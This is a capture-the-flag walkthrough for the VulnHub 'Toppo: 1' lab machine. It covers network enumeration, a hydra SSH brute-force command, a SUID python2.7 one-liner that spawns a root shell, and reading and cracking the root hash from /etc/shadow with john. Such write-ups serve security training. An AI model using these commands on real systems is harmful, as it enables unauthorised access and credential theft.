# Toppo: 1

## 1.Get VM IP
```bash
root@kali: arp-scan -I eth1 -l

Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1   00:50:56:c0:00:01       VMware, Inc.
192.168.127.239 00:0c:29:fe:2e:4d       VMware, Inc.
192.168.127.254 00:50:56:e5:26:19       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.303 seconds (111.16 hosts/sec). 3 responded
```

IP address is `192.168.127.239`, let's enumerate it

## 2.Enumeration

```bash
root@kali: nmap -sV -sC -p- -v -oN nmap.out 192.168.127.239

Nmap scan report for 192.168.127.239
Host is up (0.0013s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          44044/udp6  status
|   100024  1          53158/tcp   status
|   100024  1          53607/udp   status
|_  100024  1          53839/tcp6  status
53158/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:FE:2E:4D (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Check the webpage, it has nothing to do with, but fuzzing the web application will show `/admin` directory :

```bash
root@kali: gobuster dir --url http://192.168.127.239 --wordlist /root/wordlist/raft-large-directories.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 315] [--> http://192.168.127.239/js/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.127.239/css/]
/admin                (Status: 301) [Size: 318] [--> http://192.168.127.239/admin/]
/img                  (Status: 301) [Size: 316] [--> http://192.168.127.239/img/]
/mail                 (Status: 301) [Size: 317] [--> http://192.168.127.239/mail/]
/manual               (Status: 301) [Size: 319] [--> http://192.168.127.239/manual/]
/vendor               (Status: 301) [Size: 319] [--> http://192.168.127.239/vendor/]
/server-status        (Status: 403) [Size: 303]
/LICENSE              (Status: 200) [Size: 1093]
```

in `/admin` there is a file `notes.txt` :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/e89bff5b-ac64-4c49-a036-35fff95ca787)


## 3.Gaining shell

since it mentions the password, we can think of brute forcing the SSH service with a list of usernames :

```bash
root@kali: hydra -L /usr/share/wordlists/rockyou.txt  -p 12345ted123 192.168.127.239 ssh -t 5 -v
```

it takes a long time, or if we look closer to the password itself it has a username in it `ted`, so trying to login with `ted:12345ted123`

works fine:

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/0ea8c1c9-8747-4771-82f5-c967a1484ccb)


## 4.Privilege Escalation (Method 1)
Just check the SUID binaries available on the system :

```bash
ted@Toppo:~$ find / -user root -perm /4000 2>/dev/null

/sbin/mount.nfs
\/usr/sbin/exim4
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/python2.7
/usr/bin/chsh
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/procmail
/usr/bin/passwd
/bin/su
/bin/umount
/bin/mount
```

yes, we can run python2.7 on the system with SUID set on it :

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/d5fa4fe9-cd6d-4805-8ff4-6773c673f02f)


that's how we can get root on the system.

## 5.Privilege Escalation (Method 2)

Checking the available SUID binaries on the system shows another binary `/usr/bin/mawk`, with this binary we can also read the content of

`/etc/shadow` file :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/6eb83990-a115-41ee-8c63-2b1b1583d53d)

now we have the hash of root password, just use john to crack it :


```bash
root@kali: echo 'root:$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0:17636:0:99999:7:::' > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
test123          (root)     
1g 0:00:00:03 DONE (2023-11-04 07:14) 0.3164g/s 5670p/s 5670c/s 5670C/s paramedic..biscuit1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

the password of user root is `test123`, that was easy :)



